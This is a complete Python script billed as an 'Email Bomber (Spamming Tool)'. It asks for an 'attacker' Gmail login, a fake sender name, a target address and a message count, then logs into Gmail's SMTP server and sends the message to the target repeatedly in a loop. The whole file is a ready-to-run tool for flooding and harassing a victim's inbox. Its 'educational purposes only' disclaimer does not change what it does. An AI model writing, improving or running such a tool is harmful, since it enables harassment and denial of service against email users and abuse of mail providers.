

# Email Bomber (Spamming Tool) - Python 3 Version
# This code is for educational purposes only. Use at your own risk!

import os
import smtplib
import getpass
import sys
import time

def main():
    print("""
            #################################################
            #                                               #
            #        Email Bomber ( Spamming Tool )         #
            #                                               #
            #                  Version 2.0                  #
            #                                               #
            #           Modified by : Mohin Paramasivam     #
            #                                               #
            #       Only for Educational Purposes !!        #
            #                                               #
            #################################################
    """)

    email = input('Attacker Gmail Address : ')
    user = input('Anonymous name : ')
    passwd = getpass.getpass('Password: ')
    to = input('\nTo: ')
    body = input('Message: ')
    while True:
        try:
            total = int(input('Number of send: '))
            if total < 1:
                print('Please enter a positive integer.')
                continue
            break
        except ValueError:
            print('Please enter a valid number.')

    smtp_server = 'smtp.gmail.com'
    port = 587

    try:
        server = smtplib.SMTP(smtp_server, port)
        server.ehlo()
        server.starttls()
        server.login(email, passwd)
        for i in range(1, total + 1):
            subject = f"Message {i} from {user}"
            msg = f"From: {user}\nTo: {to}\nSubject: {subject}\n\n{body}"
            server.sendmail(email, to, msg)
            print(f"\rE-mails sent: {i}", end='')
            time.sleep(1)
            sys.stdout.flush()
        server.quit()
        print('\nDone !!!')
    except KeyboardInterrupt:
        print('[-] Canceled')
        sys.exit()
    except smtplib.SMTPAuthenticationError:
        print('\n[!] The username or password you entered is incorrect.')
        sys.exit()
    except Exception as e:
        print(f'\n[!] An error occurred: {e}')
        sys.exit()

if __name__ == "__main__":
    main()
